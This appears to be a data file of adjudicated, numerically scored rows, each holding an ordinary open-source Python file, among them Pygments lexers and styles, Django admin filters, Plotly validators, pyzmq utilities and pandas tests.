""#cd00cd"",<<NEWL>>        Keyword.Pseudo:            """",<<NEWL>>        Keyword.Type:              ""#00cd00"",<<NEWL>><<NEWL>>        Operator:                  ""#3399cc"",<<NEWL>>        Operator.Word:             ""#cdcd00"",<<NEWL>><<NEWL>>        Name:                      """",<<NEWL>>        Name.Class:                ""#00cdcd"",<<NEWL>>        Name.Builtin:              ""#cd00cd"",<<NEWL>>        Name.Exception:            ""bold #666699"",<<NEWL>>        Name.Variable:             ""#00cdcd"",<<NEWL>><<NEWL>>        String:                    ""#cd0000"",<<NEWL>>        Number:                    ""#cd00cd"",<<NEWL>><<NEWL>>        Generic.Heading:           ""bold #000080"",<<NEWL>>        Generic.Subheading:        ""bold #800080"",<<NEWL>>        Generic.Deleted:           ""#cd0000"",<<NEWL>>        Generic.Inserted:          ""#00cd00"",<<NEWL>>        Generic.Error:             ""#FF0000"",<<NEWL>>        Generic.Emph:              ""italic"",<<NEWL>>        Generic.Strong:            ""bold"",<<NEWL>>        Generic.Prompt:            ""bold #000080"",<<NEWL>>        Generic.Output:            ""#888"",<<NEWL>>        Generic.Traceback:         ""#04D"",<<NEWL>><<NEWL>>        Error:                     ""border:#FF0000""<<NEWL>>    }"
9	adjudicated	4	"#!/usr/bin/env python3<<NEWL>># Copyright (c) 2011 Google Inc. All rights reserved.<<NEWL>># Use of this source code is governed by a BSD-style license that can be<<NEWL>># found in the LICENSE file.<<NEWL>><<NEWL>>""""""These functions are executed via gyp-flock-tool when using the Makefile<<NEWL>>generator.  Used on systems that don't have a built-in flock.""""""<<NEWL>><<NEWL>>import fcntl<<NEWL>>import os<<NEWL>>import struct<<NEWL>>import subprocess<<NEWL>>import sys<<NEWL>><<NEWL>><<NEWL>>def main(args):<<NEWL>>    executor = FlockTool()<<NEWL>>    executor.Dispatch(args)<<NEWL>><<NEWL>><<NEWL>>class FlockTool:<<NEWL>>    """"""This class emulates the 'flock' command.""""""<<NEWL>><<NEWL>>    def Dispatch(self, args):<<NEWL>>        """"""Dispatches a string command to a method.""""""<<NEWL>>        if len(args) < 1:<<NEWL>>            raise Exception(""Not enough arguments"")<<NEWL>><<NEWL>>        method = ""Exec%s"" % self._CommandifyName(args[0])<<NEWL>>        getattr(self, method)(*args[1:])<<NEWL>><<NEWL>>    def _CommandifyName(self, name_string):<<NEWL>>        """"""Transforms a tool name like copy-info-plist to CopyInfoPlist""""""<<NEWL>>        return name_string.title().replace(""-"", """")<<NEWL>><<NEWL>>    def ExecFlock(self, lockfile, *cmd_list):<<NEWL>>        """"""Emulates the most basic behavior of Linux's flock(1).""""""<<NEWL>>        # Rely on exception handling to report errors.<<NEWL>>        # Note that the stock python on SunOS has a bug<<NEWL>>        # where fcntl.flock(fd, LOCK_EX) always fails<<NEWL>>        # with EBADF, that's why we use this F_SETLK<<NEWL>>        # hack instead.<<NEWL>>        fd = os.open(lockfile, os.O_WRONLY | os.O_NOCTTY | os.O_CREAT, 0o666)<<NEWL>>        if sys.platform.startswith(""aix""):<<NEWL>>            # Python on AIX is compiled with LARGEFILE support, which changes the<<NEWL>>            # struct size.<<NEWL>>            op = struct.pack(""hhIllqq"", fcntl.F_WRLCK, 0, 0, 0, 0, 0, 0)<<NEWL>>        else:<<NEWL>>            op = struct.pack(""hhllhhl"", fcntl.F_WRLCK, 0, 0, 0, 0, 0, 0)<<NEWL>>        fcntl.fcntl(fd, fcntl.F_SETLK, op)<<NEWL>>        return subprocess.call(cmd_list)<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    sys.exit(main(sys.argv[1:]))"
149	adjudicated	0	# -*- coding: utf-8 -*-<<NEWL>>from django.contrib.admin import FieldListFilter<<NEWL>>from django.contrib.admin.utils import prepare_lookup_value<<NEWL>>from django.utils.translation import gettext_lazy as _<<NEWL>><<NEWL>><<NEWL>>class NullFieldListFilter(FieldListFilter):<<NEWL>>    def __init__(self, field, request, params, model, model_admin, field_path):<<NEWL>>        self.lookup_kwarg = '{0}__isnull'.format(field_path)<<NEWL>>        super().__init__(field, request, params, model, model_admin, field_path)<<NEWL>>        lookup_choices = self.lookups(request, model_admin)<<NEWL>>        self.lookup_choices = () if lookup_choices is None else list(lookup_choices)<<NEWL>><<NEWL>>    def expected_parameters(self):<<NEWL>>        return [self.lookup_kwarg]<<NEWL>><<NEWL>>    def value(self):<<NEWL>>        return self.used_parameters.get(self.lookup_kwarg, None)<<NEWL>><<NEWL>>    def lookups(self, request, model_admin):<<NEWL>>        return (<<NEWL>>            ('1', _('Yes')),<<NEWL>>            ('0', _('No')),<<NEWL>>        )<<NEWL>><<NEWL>>    def choices(self, cl):<<NEWL>>        yield {<<NEWL>>            'selected': self.value() is None,<<NEWL>>            'query_string': cl.get_query_string({}, [self.lookup_kwarg]),<<NEWL>>            'display': _('All'),<<NEWL>>        }<<NEWL>>        for lookup, title in self.lookup_choices:<<NEWL>>            yield {<<NEWL>>                'selected': self.value() == prepare_lookup_value(self.lookup_kwarg, lookup),<<NEWL>>                'query_string': cl.get_query_string({<<NEWL>>                    self.lookup_kwarg: lookup,<<NEWL>>                }, []),<<NEWL>>                'display': title,<<NEWL>>            }<<NEWL>><<NEWL>>    def queryset(self, request, queryset):<<NEWL>>        if self.value() is not None:<<NEWL>>            kwargs = {self.lookup_kwarg: self.value()}<<NEWL>>            return queryset.filter(**kwargs)<<NEWL>>        return queryset<<NEWL>><<NEWL>><<NEWL>>class NotNullFieldListFilter(NullFieldListFilter):<<NEWL>>    def lookups(self, request, model_admin):<<NEWL>>        return (<<NEWL>>            ('0', _('Yes')),<<NEWL>>            ('1', _('No')),<<NEWL>>        )
58	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""hoverlabel"", parent_name=""scatterpolargl"", **kwargs<<NEWL>>    ):<<NEWL>>        super(HoverlabelValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            align<<NEWL>>                Sets the horizontal alignment of the text<<NEWL>>                content within hover label box. Has an effect<<NEWL>>                only if the hover label text spans more two or<<NEWL>>                more lines<<NEWL>>            alignsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `align`.<<NEWL>>            bgcolor<<NEWL>>                Sets the background color of the hover labels<<NEWL>>                for this trace<<NEWL>>            bgcolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bgcolor`.<<NEWL>>            bordercolor<<NEWL>>                Sets the border color of the hover labels for<<NEWL>>                this trace.<<NEWL>>            bordercolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bordercolor`.<<NEWL>>            font<<NEWL>>                Sets the font used in hover labels.<<NEWL>>            namelength<<NEWL>>                Sets the default length (in number of<<NEWL>>                characters) of the trace name in the hover<<NEWL>>                labels for all traces. -1 shows the whole name<<NEWL>>                regardless of length. 0-3 shows the first 0-3<<NEWL>>                characters, and an integer >3 will show the<<NEWL>>                whole name if it is less than that many<<NEWL>>                characters, but if it is longer, will truncate<<NEWL>>                to `namelength - 3` characters and add an<<NEWL>>                ellipsis.<<NEWL>>            namelengthsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `namelength`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
118	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""font"", parent_name=""candlestick.hoverlabel"", **kwargs<<NEWL>>    ):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
108	adjudicated	4	"""""""<<NEWL>>Validator for a regular language.<<NEWL>>""""""<<NEWL>>from typing import Dict<<NEWL>><<NEWL>>from prompt_toolkit.document import Document<<NEWL>>from prompt_toolkit.validation import ValidationError, Validator<<NEWL>><<NEWL>>from .compiler import _CompiledGrammar<<NEWL>><<NEWL>>__all__ = [<<NEWL>>    ""GrammarValidator"",<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>class GrammarValidator(Validator):<<NEWL>>    """"""<<NEWL>>    Validator which can be used for validation according to variables in<<NEWL>>    the grammar. Each variable can have its own validator.<<NEWL>><<NEWL>>    :param compiled_grammar: `GrammarCompleter` instance.<<NEWL>>    :param validators: `dict` mapping variable names of the grammar to the<<NEWL>>                       `Validator` instances to be used for each variable.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(<<NEWL>>        self, compiled_grammar: _CompiledGrammar, validators: Dict[str, Validator]<<NEWL>>    ) -> None:<<NEWL>><<NEWL>>        self.compiled_grammar = compiled_grammar<<NEWL>>        self.validators = validators<<NEWL>><<NEWL>>    def validate(self, document: Document) -> None:<<NEWL>>        # Parse input document.<<NEWL>>        # We use `match`, not `match_prefix`, because for validation, we want<<NEWL>>        # the actual, unambiguous interpretation of the input.<<NEWL>>        m = self.compiled_grammar.match(document.text)<<NEWL>><<NEWL>>        if m:<<NEWL>>            for v in m.variables():<<NEWL>>                validator = self.validators.get(v.varname)<<NEWL>><<NEWL>>                if validator:<<NEWL>>                    # Unescape text.<<NEWL>>                    unwrapped_text = self.compiled_grammar.unescape(v.varname, v.value)<<NEWL>><<NEWL>>                    # Create a document, for the completions API (text/cursor_position)<<NEWL>>                    inner_document = Document(unwrapped_text, len(unwrapped_text))<<NEWL>><<NEWL>>                    try:<<NEWL>>                        validator.validate(inner_document)<<NEWL>>                    except ValidationError as e:<<NEWL>>                        raise ValidationError(<<NEWL>>                            cursor_position=v.start + e.cursor_position,<<NEWL>>                            message=e.message,<<NEWL>>                        ) from e<<NEWL>>        else:<<NEWL>>            raise ValidationError(<<NEWL>>                cursor_position=len(document.text), message=""Invalid command""<<NEWL>>            )"
48	adjudicated	0	"from prowler.lib.check.models import Check, Check_Report_AWS<<NEWL>>from prowler.providers.aws.services.opensearch.opensearch_client import (<<NEWL>>    opensearch_client,<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>>class opensearch_service_domains_cloudwatch_logging_enabled(Check):<<NEWL>>    def execute(self):<<NEWL>>        findings = []<<NEWL>>        for domain in opensearch_client.opensearch_domains:<<NEWL>>            report = Check_Report_AWS(self.metadata())<<NEWL>>            report.region = domain.region<<NEWL>>            report.resource_id = domain.name<<NEWL>>            report.resource_arn = domain.arn<<NEWL>>            report.status = ""FAIL""<<NEWL>>            report.status_extended = f""Opensearch domain {domain.name} SEARCH_SLOW_LOGS and INDEX_SLOW_LOGS disabled""<<NEWL>>            has_SEARCH_SLOW_LOGS = False<<NEWL>>            has_INDEX_SLOW_LOGS = False<<NEWL>>            for logging_item in domain.logging:<<NEWL>>                if logging_item.name == ""SEARCH_SLOW_LOGS"" and logging_item.enabled:<<NEWL>>                    has_SEARCH_SLOW_LOGS = True<<NEWL>>                if logging_item.name == ""INDEX_SLOW_LOGS"" and logging_item.enabled:<<NEWL>>                    has_INDEX_SLOW_LOGS = True<<NEWL>><<NEWL>>            if has_SEARCH_SLOW_LOGS and has_INDEX_SLOW_LOGS:<<NEWL>>                report.status = ""PASS""<<NEWL>>                report.status_extended = f""Opensearch domain {domain.name} SEARCH_SLOW_LOGS and INDEX_SLOW_LOGS enabled""<<NEWL>>            elif not has_SEARCH_SLOW_LOGS and has_INDEX_SLOW_LOGS:<<NEWL>>                report.status = ""FAIL""<<NEWL>>                report.status_extended = f""Opensearch domain {domain.name} INDEX_SLOW_LOGS enabled but SEARCH_SLOW_LOGS disabled""<<NEWL>>            elif not has_INDEX_SLOW_LOGS and has_SEARCH_SLOW_LOGS:<<NEWL>>                report.status = ""FAIL""<<NEWL>>                report.status_extended = f""Opensearch domain {domain.name} SEARCH_SLOW_LOGS enabled but INDEX_SLOW_LOGS disabled""<<NEWL>><<NEWL>>            findings.append(report)<<NEWL>><<NEWL>>        return findings"
159	adjudicated	3	"""""""Models an on/off device.""""""<<NEWL>>from __future__ import annotations<<NEWL>>from typing import Any<<NEWL>><<NEWL>>from .. import ApiSession<<NEWL>>from ..info import HomeInfo<<NEWL>><<NEWL>>from .device import Device<<NEWL>>from .const import DeviceType, DeviceTypeId<<NEWL>><<NEWL>><<NEWL>>class OnOffDevice(Device):<<NEWL>>    """"""Models an on/off device with a single on/off state and command.""""""<<NEWL>><<NEWL>>    def __init__(<<NEWL>>        self,<<NEWL>>        session: ApiSession,<<NEWL>>        home: HomeInfo,<<NEWL>>        data: dict,<<NEWL>>        device_type: DeviceType,<<NEWL>>        device_type_id: int<<NEWL>>    ) -> None:<<NEWL>>        super().__init__(session, home, data, device_type, device_type_id, do_update=False)<<NEWL>>        self.is_on: bool = False<<NEWL>>        self.update(data)<<NEWL>><<NEWL>>    def update(self, data: dict[str, Any]):<<NEWL>>        """"""Update the radiator from cloud API data.""""""<<NEWL>>        super().update(data)<<NEWL>>        self.is_on = data[""on_off""] == ""1""<<NEWL>><<NEWL>>    async def set_onoff_state(self, turn_on: bool):<<NEWL>>        """"""Set the onoff state, on (true) or off (false)""""""<<NEWL>>        if turn_on == self.is_on:<<NEWL>>            return<<NEWL>><<NEWL>>        query_params = {}<<NEWL>>        query_params[""id_device""] = self.id_local<<NEWL>>        query_params[""on_off""] = ""1"" if turn_on else ""0""<<NEWL>>        query_params[""nv_mode""] = self.device_type_id<<NEWL>>        query_params[""gv_mode""] = self.device_type_id<<NEWL>><<NEWL>>        await self._session.write_query(self.home.home_id, query_params)<<NEWL>><<NEWL>>        # This is debatable - for some scenarios it is reasonable to<<NEWL>>        # update the value in the current object with the assumed<<NEWL>>        # change, for others not<<NEWL>>        self.is_on = turn_on<<NEWL>><<NEWL>>class Light(OnOffDevice):<<NEWL>>    """"""Models a light.""""""<<NEWL>><<NEWL>>    def __init__(<<NEWL>>        self,<<NEWL>>        session: ApiSession,<<NEWL>>        home: HomeInfo,<<NEWL>>        data: dict<<NEWL>>    ) -> None:<<NEWL>>        super().__init__(session, home, data, DeviceType.LIGHT, DeviceTypeId.LIGHT)<<NEWL>><<NEWL>>class Outlet(OnOffDevice):<<NEWL>>    """"""Models an outlet.""""""<<NEWL>><<NEWL>>    def __init__(<<NEWL>>        self,<<NEWL>>        session: ApiSession,<<NEWL>>        home: HomeInfo,<<NEWL>>        data: dict<<NEWL>>    ) -> None:<<NEWL>>        super().__init__(session, home, data, DeviceType.OUTLET, DeviceTypeId.OUTLET)"
19	adjudicated	2	"#!/usr/bin/env python3<<NEWL>>#<<NEWL>># Make a DWIN .ico file from a directory of JPEG icon files.<<NEWL>>#<<NEWL>>#  Copyright (c) 2020 Brent Burton<<NEWL>>#<<NEWL>>#  This program is free software: you can redistribute it and/or modify<<NEWL>>#  it under the terms of the GNU General Public License as published by<<NEWL>>#  the Free Software Foundation, either version 3 of the License, or<<NEWL>>#  (at your option) any later version.<<NEWL>>#<<NEWL>>#  This program is distributed in the hope that it will be useful,<<NEWL>>#  but WITHOUT ANY WARRANTY; without even the implied warranty of<<NEWL>>#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the<<NEWL>>#  GNU General Public License for more details.<<NEWL>>#<<NEWL>>#  You should have received a copy of the GNU General Public License<<NEWL>>#  along with this program.  If not, see <https://www.gnu.org/licenses/>.<<NEWL>>#----------------------------------------------------------------<<NEWL>><<NEWL>>import os.path<<NEWL>>import argparse<<NEWL>>import DWIN_ICO<<NEWL>><<NEWL>>version = '2.0.7'<<NEWL>><<NEWL>>#----------------<<NEWL>>if __name__ == '__main__':<<NEWL>>    try:<<NEWL>>        parser = argparse.ArgumentParser(description='Make .ico from JPEG files')<<NEWL>>        parser.add_argument('iconDir', type=str, nargs=1,<<NEWL>>                            help='name of directory containing icon JPGs')<<NEWL>>        parser.add_argument('filename', type=str, nargs=1,<<NEWL>>                            help='name of new .ico file to create')<<NEWL>>        args = parser.parse_args()<<NEWL>><<NEWL>>        filename = args.filename[0]<<NEWL>>        iconDir = args.iconDir[0]<<NEWL>><<NEWL>>        if os.path.isfile(filename):<<NEWL>>            raise RuntimeError(""ICO file '%s' already exists."" % (filename))<<NEWL>><<NEWL>>        if not os.path.exists(iconDir):<<NEWL>>            raise RuntimeError(""Icon directory '%s' doesn't exist."" % (iconDir))<<NEWL>><<NEWL>>        print(""Making .ico file '%s' from contents of '%s'"" % (filename, iconDir))<<NEWL>>        ico = DWIN_ICO.DWIN_ICO_File()<<NEWL>>        ico.createFile(iconDir, filename)<<NEWL>><<NEWL>>    except Exception as e:<<NEWL>>        print('Error: ', e)<<NEWL>>"
388	adjudicated	2	"class BaseInstanceLoader:<<NEWL>>    """"""<<NEWL>>    Base abstract implementation of instance loader.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(self, resource, dataset=None):<<NEWL>>        self.resource = resource<<NEWL>>        self.dataset = dataset<<NEWL>><<NEWL>>    def get_instance(self, row):<<NEWL>>        raise NotImplementedError<<NEWL>><<NEWL>><<NEWL>>class ModelInstanceLoader(BaseInstanceLoader):<<NEWL>>    """"""<<NEWL>>    Instance loader for Django model.<<NEWL>><<NEWL>>    Lookup for model instance by ``import_id_fields``.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def get_queryset(self):<<NEWL>>        return self.resource.get_queryset()<<NEWL>><<NEWL>>    def get_instance(self, row):<<NEWL>>        try:<<NEWL>>            params = {}<<NEWL>>            for key in self.resource.get_import_id_fields():<<NEWL>>                field = self.resource.fields[key]<<NEWL>>                params[field.attribute] = field.clean(row)<<NEWL>>            if params:<<NEWL>>                return self.get_queryset().get(**params)<<NEWL>>            else:<<NEWL>>                return None<<NEWL>>        except self.resource._meta.model.DoesNotExist:<<NEWL>>            return None<<NEWL>><<NEWL>><<NEWL>>class CachedInstanceLoader(ModelInstanceLoader):<<NEWL>>    """"""<<NEWL>>    Loads all possible model instances in dataset avoid hitting database for<<NEWL>>    every ``get_instance`` call.<<NEWL>><<NEWL>>    This instance loader work only when there is one ``import_id_fields``<<NEWL>>    field.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(self, *args, **kwargs):<<NEWL>>        super().__init__(*args, **kwargs)<<NEWL>><<NEWL>>        pk_field_name = self.resource.get_import_id_fields()[0]<<NEWL>>        self.pk_field = self.resource.fields[pk_field_name]<<NEWL>><<NEWL>>        ids = [self.pk_field.clean(row) for row in self.dataset.dict]<<NEWL>>        qs = self.get_queryset().filter(**{<<NEWL>>            ""%s__in"" % self.pk_field.attribute: ids<<NEWL>>            })<<NEWL>><<NEWL>>        self.all_instances = {<<NEWL>>            self.pk_field.get_value(instance): instance<<NEWL>>            for instance in qs<<NEWL>>        }<<NEWL>><<NEWL>>    def get_instance(self, row):<<NEWL>>        return self.all_instances.get(self.pk_field.clean(row))"
497	adjudicated	3	"""""""miscellaneous zmq_utils wrapping""""""<<NEWL>><<NEWL>># Copyright (C) PyZMQ Developers<<NEWL>># Distributed under the terms of the Modified BSD License.<<NEWL>><<NEWL>>from zmq.error import InterruptedSystemCall, _check_rc, _check_version<<NEWL>><<NEWL>>from ._cffi import ffi<<NEWL>>from ._cffi import lib as C<<NEWL>><<NEWL>><<NEWL>>def has(capability):<<NEWL>>    """"""Check for zmq capability by name (e.g. 'ipc', 'curve')<<NEWL>><<NEWL>>    .. versionadded:: libzmq-4.1<<NEWL>>    .. versionadded:: 14.1<<NEWL>>    """"""<<NEWL>>    _check_version((4, 1), 'zmq.has')<<NEWL>>    if isinstance(capability, str):<<NEWL>>        capability = capability.encode('utf8')<<NEWL>>    return bool(C.zmq_has(capability))<<NEWL>><<NEWL>><<NEWL>>def curve_keypair():<<NEWL>>    """"""generate a Z85 key pair for use with zmq.CURVE security<<NEWL>><<NEWL>>    Requires libzmq (≥ 4.0) to have been built with CURVE support.<<NEWL>><<NEWL>>    Returns<<NEWL>>    -------<<NEWL>>    (public, secret) : two bytestrings<<NEWL>>        The public and private key pair as 40 byte z85-encoded bytestrings.<<NEWL>>    """"""<<NEWL>>    _check_version((3, 2), ""curve_keypair"")<<NEWL>>    public = ffi.new('char[64]')<<NEWL>>    private = ffi.new('char[64]')<<NEWL>>    rc = C.zmq_curve_keypair(public, private)<<NEWL>>    _check_rc(rc)<<NEWL>>    return ffi.buffer(public)[:40], ffi.buffer(private)[:40]<<NEWL>><<NEWL>><<NEWL>>def curve_public(private):<<NEWL>>    """"""Compute the public key corresponding to a private key for use<<NEWL>>    with zmq.CURVE security<<NEWL>><<NEWL>>    Requires libzmq (≥ 4.2) to have been built with CURVE support.<<NEWL>><<NEWL>>    Parameters<<NEWL>>    ----------<<NEWL>>    private<<NEWL>>        The private key as a 40 byte z85-encoded bytestring<<NEWL>>    Returns<<NEWL>>    -------<<NEWL>>    bytestring<<NEWL>>        The public key as a 40 byte z85-encoded bytestring.<<NEWL>>    """"""<<NEWL>>    if isinstance(private, str):<<NEWL>>        private = private.encode('utf8')<<NEWL>>    _check_version((4, 2), ""curve_public"")<<NEWL>>    public = ffi.new('char[64]')<<NEWL>>    rc = C.zmq_curve_public(public, private)<<NEWL>>    _check_rc(rc)<<NEWL>>    return ffi.buffer(public)[:40]<<NEWL>><<NEWL>><<NEWL>>def _retry_sys_call(f, *args, **kwargs):<<NEWL>>    """"""make a call, retrying if interrupted with EINTR""""""<<NEWL>>    while True:<<NEWL>>        rc = f(*args)<<NEWL>>        try:<<NEWL>>            _check_rc(rc)<<NEWL>>        except InterruptedSystemCall:<<NEWL>>            continue<<NEWL>>        else:<<NEWL>>            break<<NEWL>><<NEWL>><<NEWL>>__all__ = ['has', 'curve_keypair', 'curve_public']"
464	adjudicated	1	"import os<<NEWL>><<NEWL>>import pytest<<NEWL>><<NEWL>>import pandas.compat as compat<<NEWL>><<NEWL>>import pandas._testing as tm<<NEWL>><<NEWL>><<NEWL>>def test_rands():<<NEWL>>    r = tm.rands(10)<<NEWL>>    assert len(r) == 10<<NEWL>><<NEWL>><<NEWL>>def test_rands_array_1d():<<NEWL>>    arr = tm.rands_array(5, size=10)<<NEWL>>    assert arr.shape == (10,)<<NEWL>>    assert len(arr[0]) == 5<<NEWL>><<NEWL>><<NEWL>>def test_rands_array_2d():<<NEWL>>    arr = tm.rands_array(7, size=(10, 10))<<NEWL>>    assert arr.shape == (10, 10)<<NEWL>>    assert len(arr[1, 1]) == 7<<NEWL>><<NEWL>><<NEWL>>def test_numpy_err_state_is_default():<<NEWL>>    expected = {""over"": ""warn"", ""divide"": ""warn"", ""invalid"": ""warn"", ""under"": ""ignore""}<<NEWL>>    import numpy as np<<NEWL>><<NEWL>>    # The error state should be unchanged after that import.<<NEWL>>    assert np.geterr() == expected<<NEWL>><<NEWL>><<NEWL>>def test_convert_rows_list_to_csv_str():<<NEWL>>    rows_list = [""aaa"", ""bbb"", ""ccc""]<<NEWL>>    ret = tm.convert_rows_list_to_csv_str(rows_list)<<NEWL>><<NEWL>>    if compat.is_platform_windows():<<NEWL>>        expected = ""aaa\r\nbbb\r\nccc\r\n""<<NEWL>>    else:<<NEWL>>        expected = ""aaa\nbbb\nccc\n""<<NEWL>><<NEWL>>    assert ret == expected<<NEWL>><<NEWL>><<NEWL>>def test_create_temp_directory():<<NEWL>>    with tm.ensure_clean_dir() as path:<<NEWL>>        assert os.path.exists(path)<<NEWL>>        assert os.path.isdir(path)<<NEWL>>    assert not os.path.exists(path)<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.parametrize(""strict_data_files"", [True, False])<<NEWL>>def test_datapath_missing(datapath):<<NEWL>>    with pytest.raises(ValueError, match=""Could not find file""):<<NEWL>>        datapath(""not_a_file"")<<NEWL>><<NEWL>><<NEWL>>def test_datapath(datapath):<<NEWL>>    args = (""io"", ""data"", ""csv"", ""iris.csv"")<<NEWL>><<NEWL>>    result = datapath(*args)<<NEWL>>    expected = os.path.join(os.path.dirname(os.path.dirname(__file__)), *args)<<NEWL>><<NEWL>>    assert result == expected<<NEWL>><<NEWL>><<NEWL>>def test_rng_context():<<NEWL>>    import numpy as np<<NEWL>><<NEWL>>    expected0 = 1.764052345967664<<NEWL>>    expected1 = 1.6243453636632417<<NEWL>><<NEWL>>    with tm.RNGContext(0):<<NEWL>>        with tm.RNGContext(1):<<NEWL>>            assert np.random.randn() == expected1<<NEWL>>        assert np.random.randn() == expected0<<NEWL>><<NEWL>><<NEWL>>def test_external_error_raised():<<NEWL>>    with tm.external_error_raised(TypeError):<<NEWL>>        raise TypeError(""Should not check this error message, so it will pass"")"
435	adjudicated	3	"""""""<<NEWL>>    pygments.lexers.sgf<<NEWL>>    ~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    Lexer for Smart Game Format (sgf) file format.<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.lexer import RegexLexer, bygroups<<NEWL>>from pygments.token import Name, Literal, String, Text, Punctuation, Whitespace<<NEWL>><<NEWL>>__all__ = [""SmartGameFormatLexer""]<<NEWL>><<NEWL>><<NEWL>>class SmartGameFormatLexer(RegexLexer):<<NEWL>>    """"""<<NEWL>>    Lexer for Smart Game Format (sgf) file format.<<NEWL>><<NEWL>>    The format is used to store game records of board games for two players<<NEWL>>    (mainly Go game).<<NEWL>><<NEWL>>    .. versionadded:: 2.4<<NEWL>>    """"""<<NEWL>>    name = 'SmartGameFormat'<<NEWL>>    url = 'https://www.red-bean.com/sgf/'<<NEWL>>    aliases = ['sgf']<<NEWL>>    filenames = ['*.sgf']<<NEWL>><<NEWL>>    tokens = {<<NEWL>>        'root': [<<NEWL>>            (r'[():;]+', Punctuation),<<NEWL>>            # tokens:<<NEWL>>            (r'(A[BW]|AE|AN|AP|AR|AS|[BW]L|BM|[BW]R|[BW]S|[BW]T|CA|CH|CP|CR|'<<NEWL>>             r'DD|DM|DO|DT|EL|EV|EX|FF|FG|G[BW]|GC|GM|GN|HA|HO|ID|IP|IT|IY|KM|'<<NEWL>>             r'KO|LB|LN|LT|L|MA|MN|M|N|OB|OM|ON|OP|OT|OV|P[BW]|PC|PL|PM|RE|RG|'<<NEWL>>             r'RO|RU|SO|SC|SE|SI|SL|SO|SQ|ST|SU|SZ|T[BW]|TC|TE|TM|TR|UC|US|VW|'<<NEWL>>             r'V|[BW]|C)',<<NEWL>>             Name.Builtin),<<NEWL>>            # number:<<NEWL>>            (r'(\[)([0-9.]+)(\])',<<NEWL>>             bygroups(Punctuation, Literal.Number, Punctuation)),<<NEWL>>            # date:<<NEWL>>            (r'(\[)([0-9]{4}-[0-9]{2}-[0-9]{2})(\])',<<NEWL>>             bygroups(Punctuation, Literal.Date, Punctuation)),<<NEWL>>            # point:<<NEWL>>            (r'(\[)([a-z]{2})(\])',<<NEWL>>             bygroups(Punctuation, String, Punctuation)),<<NEWL>>            # double points:<<NEWL>>            (r'(\[)([a-z]{2})(:)([a-z]{2})(\])',<<NEWL>>             bygroups(Punctuation, String, Punctuation, String, Punctuation)),<<NEWL>><<NEWL>>            (r'(\[)([\w\s#()+,\-.:?]+)(\])',<<NEWL>>             bygroups(Punctuation, String, Punctuation)),<<NEWL>>            (r'(\[)(\s.*)(\])',<<NEWL>>             bygroups(Punctuation, Whitespace, Punctuation)),<<NEWL>>            (r'\s+', Whitespace)<<NEWL>>        ],<<NEWL>>    }"
